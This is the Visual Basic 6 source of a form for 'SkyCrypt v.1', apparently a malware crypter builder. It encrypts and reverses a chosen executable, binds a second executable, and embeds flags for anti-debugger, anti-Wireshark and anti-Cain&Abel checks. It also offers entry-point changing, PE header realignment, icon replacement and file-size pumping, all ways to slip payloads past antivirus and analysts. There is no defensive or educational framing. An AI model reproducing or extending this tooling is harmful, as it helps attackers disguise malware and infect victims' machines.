VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#12.0#0"; "CODEJO~3.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "SkyCrypt v.1"
   ClientHeight    =   6735
   ClientLeft      =   5265
   ClientTop       =   3420
   ClientWidth     =   7485
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6735
   ScaleWidth      =   7485
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.PictureBox Picture1 
      BorderStyle     =   0  'Kein
      Height          =   6855
      Left            =   0
      Picture         =   "Form1.frx":0000
      ScaleHeight     =   6855
      ScaleWidth      =   7575
      TabIndex        =   0
      Top             =   0
      Width           =   7575
      Begin VB.Timer Timer4 
         Enabled         =   0   'False
         Interval        =   800
         Left            =   6720
         Top             =   2160
      End
      Begin MSComDlg.CommonDialog cdl3 
         Left            =   5760
         Top             =   2160
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin MSComDlg.CommonDialog cdl2 
         Left            =   5280
         Top             =   2160
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin XtremeSuiteControls.TabControl TabControl1 
         Height          =   3495
         Left            =   120
         TabIndex        =   3
         Top             =   2160
         Width           =   7215
         _Version        =   786432
         _ExtentX        =   12726
         _ExtentY        =   6165
         _StockProps     =   68
         Appearance      =   11
         Color           =   2
         ItemCount       =   2
         Item(0).Caption =   "File/Settings"
         Item(0).ControlCount=   20
         Item(0).Control(0)=   "Label1"
         Item(0).Control(1)=   "PushButton2"
         Item(0).Control(2)=   "CheckBox1"
         Item(0).Control(3)=   "CheckBox2"
         Item(0).Control(4)=   "CheckBox3"
         Item(0).Control(5)=   "CheckBox4"
         Item(0).Control(6)=   "CheckBox5"
         Item(0).Control(7)=   "PushButton3"
         Item(0).Control(8)=   "PushButton4"
         Item(0).Control(9)=   "PushButton5"
         Item(0).Control(10)=   "PushButton6"
         Item(0).Control(11)=   "CheckBox6"
         Item(0).Control(12)=   "CheckBox7"
         Item(0).Control(13)=   "txtfile"
         Item(0).Control(14)=   "txtbindfile"
         Item(0).Control(15)=   "txticonfile"
         Item(0).Control(16)=   "Encryptionkeytxt"
         Item(0).Control(17)=   "Splitkeytxt"
         Item(0).Control(18)=   "Text2"
         Item(0).Control(19)=   "CheckBox8"
         Item(1).Caption =   "About"
         Item(1).ControlCount=   2
         Item(1).Control(0)=   "ListView1"
         Item(1).Control(1)=   "Text1"
         Begin VB.TextBox Text1 
            Height          =   2775
            Left            =   -69880
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            TabIndex        =   25
            Text            =   "Form1.frx":CD5A
            Top             =   600
            Visible         =   0   'False
            Width           =   6975
         End
         Begin XtremeSuiteControls.ListView ListView1 
            Height          =   2775
            Left            =   -69880
            TabIndex        =   24
            Top             =   600
            Visible         =   0   'False
            Width           =   6975
            _Version        =   786432
            _ExtentX        =   12303
            _ExtentY        =   4895
            _StockProps     =   77
            BackColor       =   -2147483643
            Appearance      =   6
         End
         Begin XtremeSuiteControls.CheckBox CheckBox8 
            Height          =   255
            Left            =   2280
            TabIndex        =   23
            Top             =   3000
            Width           =   1935
            _Version        =   786432
            _ExtentX        =   3413
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Enable Exe-Pump"
            Appearance      =   6
         End
         Begin VB.Timer Timer3 
            Enabled         =   0   'False
            Interval        =   10
            Left            =   6120
            Top             =   0
         End
         Begin VB.Timer Timer2 
            Enabled         =   0   'False
            Interval        =   800
            Left            =   3720
            Top             =   0
         End
         Begin VB.Timer Timer1 
            Enabled         =   0   'False
            Interval        =   10
            Left            =   4200
            Top             =   0
         End
         Begin MSComDlg.CommonDialog cdl1 
            Left            =   4680
            Top             =   0
            _ExtentX        =   847
            _ExtentY        =   847
            _Version        =   393216
         End
         Begin XtremeSuiteControls.FlatEdit Text2 
            Height          =   255
            Left            =   4320
            TabIndex        =   22
            Top             =   3000
            Width           =   2655
            _Version        =   786432
            _ExtentX        =   4683
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            Enabled         =   0   'False
            Appearance      =   6
         End
         Begin XtremeSuiteControls.CheckBox CheckBox7 
            Height          =   255
            Left            =   120
            TabIndex        =   21
            Top             =   3000
            Width           =   1335
            _Version        =   786432
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Wireshark"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.CheckBox CheckBox6 
            Height          =   255
            Left            =   120
            TabIndex        =   20
            Top             =   2760
            Width           =   1335
            _Version        =   786432
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Cain&&Able"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.PushButton PushButton6 
            Height          =   255
            Left            =   2280
            TabIndex        =   19
            Top             =   2640
            Width           =   1935
            _Version        =   786432
            _ExtentX        =   3413
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Browse Icon File"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.FlatEdit txticonfile 
            Height          =   255
            Left            =   4320
            TabIndex        =   18
            Top             =   2640
            Width           =   2655
            _Version        =   786432
            _ExtentX        =   4683
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            Locked          =   -1  'True
            Appearance      =   6
         End
         Begin XtremeSuiteControls.PushButton PushButton5 
            Height          =   255
            Left            =   2280
            TabIndex        =   17
            Top             =   2280
            Width           =   1935
            _Version        =   786432
            _ExtentX        =   3413
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Browse Bind File"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.FlatEdit txtbindfile 
            Height          =   255
            Left            =   4320
            TabIndex        =   16
            Top             =   2280
            Width           =   2655
            _Version        =   786432
            _ExtentX        =   4683
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            Locked          =   -1  'True
            Appearance      =   6
         End
         Begin XtremeSuiteControls.PushButton PushButton4 
            Height          =   255
            Left            =   2280
            TabIndex        =   15
            Top             =   1920
            Width           =   1935
            _Version        =   786432
            _ExtentX        =   3413
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Generate Encryption Key"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.PushButton PushButton3 
            Height          =   255
            Left            =   2280
            TabIndex        =   14
            Top             =   1560
            Width           =   1935
            _Version        =   786432
            _ExtentX        =   3413
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Generate Split Key"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.FlatEdit Encryptionkeytxt 
            Height          =   255
            Left            =   4320
            TabIndex        =   13
            Top             =   1920
            Width           =   2655
            _Version        =   786432
            _ExtentX        =   4683
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            Locked          =   -1  'True
            Appearance      =   6
         End
         Begin XtremeSuiteControls.FlatEdit Splitkeytxt 
            Height          =   255
            Left            =   4320
            TabIndex        =   12
            Top             =   1560
            Width           =   2655
            _Version        =   786432
            _ExtentX        =   4683
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            Locked          =   -1  'True
            Appearance      =   6
         End
         Begin XtremeSuiteControls.CheckBox CheckBox5 
            Height          =   255
            Left            =   120
            TabIndex        =   11
            Top             =   2520
            Width           =   1455
            _Version        =   786432
            _ExtentX        =   2566
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Read EOF Data"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.CheckBox CheckBox4 
            Height          =   255
            Left            =   120
            TabIndex        =   10
            Top             =   2280
            Width           =   1335
            _Version        =   786432
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Anti Debugger"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.CheckBox CheckBox3 
            Height          =   255
            Left            =   120
            TabIndex        =   9
            Top             =   2040
            Width           =   1575
            _Version        =   786432
            _ExtentX        =   2778
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Change Entrypoint"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.CheckBox CheckBox2 
            Height          =   255
            Left            =   120
            TabIndex        =   8
            Top             =   1800
            Width           =   1695
            _Version        =   786432
            _ExtentX        =   2990
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Realign PE Header"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.CheckBox CheckBox1 
            Height          =   255
            Left            =   120
            TabIndex        =   7
            Top             =   1560
            Width           =   1335
            _Version        =   786432
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Clean Hexcode"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.PushButton PushButton2 
            Height          =   375
            Left            =   120
            TabIndex        =   6
            Top             =   960
            Width           =   6975
            _Version        =   786432
            _ExtentX        =   12303
            _ExtentY        =   661
            _StockProps     =   79
            Caption         =   "Browse File"
            Appearance      =   6
         End
         Begin XtremeSuiteControls.FlatEdit txtfile 
            Height          =   255
            Left            =   600
            TabIndex        =   4
            Top             =   600
            Width           =   6495
            _Version        =   786432
            _ExtentX        =   11456
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            Text            =   "File Path..."
            Locked          =   -1  'True
            Appearance      =   6
         End
         Begin VB.Label Label1 
            AutoSize        =   -1  'True
            BackStyle       =   0  'Transparent
            Caption         =   "File:"
            Height          =   195
            Left            =   120
            TabIndex        =   5
            Top             =   600
            Width           =   285
         End
      End
      Begin XtremeSuiteControls.PushButton PushButton1 
         Height          =   375
         Left            =   120
         TabIndex        =   2
         Top             =   5760
         Width           =   7215
         _Version        =   786432
         _ExtentX        =   12726
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Create"
         Appearance      =   6
      End
      Begin XtremeSuiteControls.ProgressBar ProgressBar1 
         Height          =   375
         Left            =   120
         TabIndex        =   1
         Top             =   6240
         Width           =   7215
         _Version        =   786432
         _ExtentX        =   12726
         _ExtentY        =   661
         _StockProps     =   93
         Appearance      =   6
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const Letters1 = "abcdefghijklmnopqrstuvwxyz"
Const Letters2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const Letters3 = "1234567890"
Const Letters4 = "ß´+#-.,;:_'*?`=)(/&%$§""!°^<>|"

Private Sub CheckBox8_Click()
If CheckBox8.Value = 1 Then
Text2.Enabled = True
Else
Text2.Enabled = False
End If
End Sub

Private Sub Form_Load()
PushButton3.Value = 1
PushButton4.Value = 1
End Sub

Private Sub PushButton1_Click()
Dim res() As Byte
Dim rSize As String
Dim sSize As String
Dim bSize As String
Dim EOF As String
Dim EncryptedFile As String
Dim EncryptBindFile As String
Dim Reverse As String

If txtfile.Text = "" Or txtfile.Text = "File Path..." Then
MsgBox "Please choose a File!", vbInformation, "Info"
Exit Sub
End If

res() = LoadResData(101, "CUSTOM")

Open txtfile.Text For Binary Access Read As #1
sSize = Space(LOF(1) + 1)
Get #1, , sSize
Close #1

ProgressBar1.Value = 10

If CheckBox5.Value = 1 Then
EOF = ReadEOFData(txtfile.Text)
End If

Open App.Path & "\Sky.exe" For Binary Access Write As #1
Put #1, , res()
Close #1

ProgressBar1.Value = 20

Open App.Path & "\Sky.exe" For Binary Access Read As #1
rSize = Space(LOF(1) + 1)
Get #1, , rSize
Close #1

If txtbindfile.Text = "" Then
Else
Open txtbindfile.Text For Binary Access Read As #1
bSize = Space(LOF(1) + 1)
Get #1, , bSize
Close #1
End If

ProgressBar1.Value = 35

EncryptedFile = Encry(sSize, Encryptionkeytxt.Text)
EncryptBindFile = Encry(bSize, Encryptionkeytxt.Text)
Reverse = StrReverse(EncryptedFile)

ProgressBar1.Value = 55

If CheckBox4.Value = 1 Then
Dim AntiDebug As String
AntiDebug = CheckBox4.Value
End If

If CheckBox6.Value = 1 Then
Dim AntiCainAble As String
AntiCainAble = CheckBox6.Value
End If

If CheckBox7.Value = 1 Then
Dim AntiWireshark As String
AntiWireshark = CheckBox7.Value
End If

ProgressBar1.Value = 67

With cdl1
.CancelError = False
.FileName = ""
.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
.ShowSave
End With

Open cdl1.FileName For Binary Access Write As #1
Put #1, , rSize & Splitkeytxt.Text
Put #1, , Reverse & Splitkeytxt.Text
Put #1, , EncryptBindFile & Splitkeytxt.Text
Put #1, , AntiDebug & Splitkeytxt.Text
Put #1, , AntiCainAble & Splitkeytxt.Text
Put #1, , AntiWireshark & Splitkeytxt.Text
Put #1, , Encryptionkeytxt.Text & Splitkeytxt.Text
Put #1, , "#*~Fly|Sky~*#" & Splitkeytxt.Text & "#*~Fly|Sky~*#"
If CheckBox8.Value = 1 Then
Dim PUMP_STRING As String
Dim EXE_PUMP As String
EXE_PUMP = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  "
For i = 0 To Text2.Text
PUMP_STRING = PUMP_STRING & EXE_PUMP
Next i
Put #1, LOF(1) + 1, PUMP_STRING
Close #1
End If
Close #1

ProgressBar1.Value = 78

If CheckBox5.Value = 1 Then
Call WriteEOFData(cdl1.FileName, EOF)
End If

If CheckBox2.Value = 1 Then
Call RealignPEFromFile(cdl1.FileName)
End If

If CheckBox3.Value = 1 Then
Call ChangeOEPFromFile(cdl1.FileName)
End If

ProgressBar1.Value = 90

If txticonfile.Text = "" Then
Else
Call ReplaceIcons(txticonfile.Text, cdl1.FileName, Err)
End If

ProgressBar1.Value = 100

Kill (App.Path & "\Sky.exe")
ProgressBar1.Value = 0
MsgBox "File wurde erfolgreich verschlüsselt!", vbInformation, "Info"
End Sub
Public Function CodeKey()
Dim Letters As String
Dim i As Integer
Letters = Letters1 + Letters2 + Letters3 + Letters4
For i = 1 To 25
CodeKey = CodeKey & Mid$(Letters, Int((Rnd * Len(Letters)) + 1), 1)
Next i
End Function
Public Function SplitKey()
Dim Letters As String
Dim i As Integer
Letters = Letters1 + Letters2 + Letters3 + Letters4
For i = 1 To 25
SplitKey = SplitKey & Mid$(Letters, Int((Rnd * Len(Letters)) + 1), 1)
Next i
End Function
Private Sub PushButton2_Click()
With cdl1
.CancelError = False
.DialogTitle = "Open PE File"
.FileName = ""
.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
.ShowOpen
txtfile.Text = .FileName
End With
End Sub

Private Sub PushButton3_Click()
Timer3.Enabled = True
Timer4.Enabled = True
End Sub

Private Sub PushButton4_Click()
Timer1.Enabled = True
Timer2.Enabled = True
End Sub

Private Sub PushButton5_Click()
With cdl2
.CancelError = False
.DialogTitle = "Open Bind File"
.FileName = ""
.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
.ShowOpen
txtbindfile.Text = .FileName
End With
End Sub

Private Sub PushButton6_Click()
With cdl3
.CancelError = False
.DialogTitle = "Open Icon File"
.FileName = ""
.Filter = "Icons (*.ico)|*.ico"
.ShowOpen
txticonfile.Text = .FileName
End With
End Sub

Private Sub PushButton7_Click()

End Sub

Private Sub Timer1_Timer()
Dim EncryptCode As String
EncryptCode = Str2Ascc(CodeKey)
Encryptionkeytxt.Text = EncryptCode
End Sub

Private Sub Timer2_Timer()
Timer1.Enabled = False
Timer2.Enabled = False
End Sub

Private Sub Timer3_Timer()
Dim EncryptSplit As String
EncryptSplit = Str2Asc(SplitKey)
Splitkeytxt.Text = EncryptSplit
End Sub

Private Sub Timer4_Timer()
Timer3.Enabled = False
Timer4.Enabled = False
End Sub
Function Str2Asc(Text As String) As String
Dim lefts As String
Dim rights As String
Dim X As String
Dim Y As String
Dim legh As String
Dim lenh As String
Dim o As String
Dim fin As String


If Text = "" Then
    Exit Function
End If

o = 1
Y = 0
X = 1

fin = ""

Do Until Y = 1

lefts = Left(Text, X)
rights = Right(lefts, 1)

If o = Len(Text) Then
Y = 1
End If

fin = fin & Asc(rights) & "-#*Fly*#-"

o = o + 1
X = X + 1
Loop

legh = Len(fin)
fin = Left(fin, legh - 1)

Str2Asc = fin
End Function
Function Str2Ascc(Text As String) As String
Dim lefts As String
Dim rights As String
Dim X As String
Dim Y As String
Dim legh As String
Dim lenh As String
Dim o As String
Dim fin As String


If Text = "" Then
    Exit Function
End If

o = 1
Y = 0
X = 1

fin = ""

Do Until Y = 1

lefts = Left(Text, X)
rights = Right(lefts, 1)

If o = Len(Text) Then
Y = 1
End If

fin = fin & Asc(rights) & "-#*Sky*#-"

o = o + 1
X = X + 1
Loop

legh = Len(fin)
fin = Left(fin, legh - 1)

Str2Ascc = fin
End Function
